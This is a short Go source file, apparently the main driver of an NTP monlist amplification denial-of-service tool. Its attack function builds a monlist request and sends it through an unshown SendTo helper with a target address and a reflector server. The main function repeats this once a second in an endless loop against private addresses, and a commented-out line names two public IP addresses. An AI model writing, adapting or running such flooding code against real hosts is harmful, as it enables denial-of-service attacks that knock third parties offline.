package main

import "fmt"
import "time"

// name: main.go
// date: 2017-01-17 17:37:12
// author: konghui@live.cn

func attack(target string, server string) (err error) {
	var b []byte
	b, err = NewMonListRequest()
	err = SendTo(target, server, 3000, 2000, b)
	if err != nil {
		return
	}
	return
}

func main() {
	//err := attack("106.185.30.175", "223.82.209.82")
	for {
		err := attack("172.19.90.2", "172.19.90.3")
		if err != nil {
			fmt.Println(err.Error())
		}
		time.Sleep(1 * time.Second)
	}
}
